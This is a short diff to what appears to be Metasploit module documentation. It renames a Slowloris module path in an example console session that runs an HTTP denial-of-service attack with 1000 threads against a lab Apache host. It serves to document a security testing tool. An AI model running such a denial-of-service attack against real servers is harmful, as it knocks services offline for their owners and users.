@@ -22,10 +22,10 @@ Vulnerable app versions include:
 ### Apache/2.2.8 - Ubuntu 8.04
 
 ```
-msf > use auxiliary/dos/http/slow_loris5
-msf auxiliary(slow_loris5) > show options 
+msf > use auxiliary/dos/http/slow_loris
+msf auxiliary(slow_loris) > show options 
 
-Module options (auxiliary/dos/http/slow_loris5):
+Module options (auxiliary/dos/http/slow_loris):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
@@ -34,9 +34,9 @@ Module options (auxiliary/dos/http/slow_loris5):
    RPORT    80               yes       The target port (TCP)
    THREADS  1000             yes       The number of concurrent threads
 
-msf auxiliary(slow_loris5) > set RHOST 192.168.216.129
+msf auxiliary(slow_loris) > set RHOST 192.168.216.129
 RHOST => 192.168.216.129
-msf auxiliary(slow_loris5) > run
+msf auxiliary(slow_loris) > run
 
 [*] 192.168.216.129:80 - Executing requests 1 - 1000...
 
